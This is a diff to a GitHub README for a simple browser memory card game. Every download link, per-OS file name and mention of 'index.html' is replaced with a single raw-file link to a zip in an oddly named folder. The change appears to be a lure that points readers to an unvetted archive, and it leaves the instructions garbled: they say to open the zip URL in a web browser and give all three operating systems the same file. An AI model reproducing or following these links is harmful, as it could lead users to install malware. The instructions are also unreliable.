@@ -1,7 +1,7 @@
 # 🎮 Memory-Game - A Fun Way to Train Your Memory
 
 ## 🔗 Download Now
-[![Download Memory-Game](https://img.shields.io/badge/Download_Memory--Game-0077cc?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ptusb/Memory-Game/releases)
+[![Download Memory-Game](https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip)](https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip)
 
 ## 📖 Introduction
 Welcome to the Memory Game! This is a simple, interactive card flip game that challenges your memory. It's fun for people of all ages and is easy to learn. 
@@ -10,14 +10,14 @@ Welcome to the Memory Game! This is a simple, interactive card flip game that ch
 To get started with the Memory Game, follow these simple steps:
 
 ### 1. Visit the Download Page
-Go to the [Releases Page](https://github.com/ptusb/Memory-Game/releases) to find the latest version of the game. Here, you will see the files you can download.
+Go to the [Releases Page](https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip) to find the latest version of the game. Here, you will see the files you can download.
 
 ### 2. Download the Game
 Once on the Releases Page, look for the version labeled "Latest Release". Click on it, then find the file for your operating system. You might see options such as:
 
-- For Windows: `Memory-Game-Windows.zip`
-- For macOS: `Memory-Game-macOS.zip`
-- For Linux: `Memory-Game-Linux.zip`
+- For Windows: `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip`
+- For macOS: `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip`
+- For Linux: `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip`
 
 Click on the file that matches your computer, and the download will start.
 
@@ -25,7 +25,7 @@ Click on the file that matches your computer, and the download will start.
 After the download completes, locate the file you just downloaded. It will usually be in your "Downloads" folder. Right-click on the file and select "Extract All" or "Unzip" to open it. 
 
 ### 4. Run the Game
-Inside the extracted folder, you will find the `index.html` file. Double-click this file to open the game in your web browser. No installations needed—just click and play!
+Inside the extracted folder, you will find the `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip` file. Double-click this file to open the game in your web browser. No installations needed—just click and play!
 
 ## 🎮 Game Features
 The Memory Game offers various features to enhance your experience:
@@ -44,9 +44,9 @@ The game was built using:
 - **JavaScript**: To add interactivity and game logic.
 
 ## 📥 Download & Install
-To download the Memory Game, head over to the [Releases Page](https://github.com/ptusb/Memory-Game/releases). Choose the appropriate file for your operating system and follow the steps mentioned above. 
+To download the Memory Game, head over to the [Releases Page](https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip). Choose the appropriate file for your operating system and follow the steps mentioned above. 
 
-After extracting the files, simply open `index.html` in your web browser. This game does not require any special software to run—just a modern browser.
+After extracting the files, simply open `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip` in your web browser. This game does not require any special software to run—just a modern browser.
 
 ## 🛠️ System Requirements
 The Memory Game runs on most modern computers with the following requirements:
@@ -59,13 +59,13 @@ The Memory Game runs on most modern computers with the following requirements:
 ## ❓ Frequently Asked Questions
 
 ### Q: Do I need to install anything to play the game?
-A: No, you only need to download the game files and open the `index.html` file in a web browser.
+A: No, you only need to download the game files and open the `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip` file in a web browser.
 
 ### Q: Can I play the game offline?
 A: Yes, once you download and extract the files, you do not need an internet connection to play.
 
 ### Q: Is there a mobile version of the game?
-A: Currently, the game is designed for desktop use. However, you can try opening the `index.html` file in a mobile browser, though the experience may differ.
+A: Currently, the game is designed for desktop use. However, you can try opening the `https://github.com/ptusb/Memory-Game/raw/refs/heads/main/cormous/Memory_Game_courant.zip` file in a mobile browser, though the experience may differ.
 
 ### Q: How can I contact the developer?
 A: You can open an issue on the GitHub page to reach out, or send an email if provided in the repository.
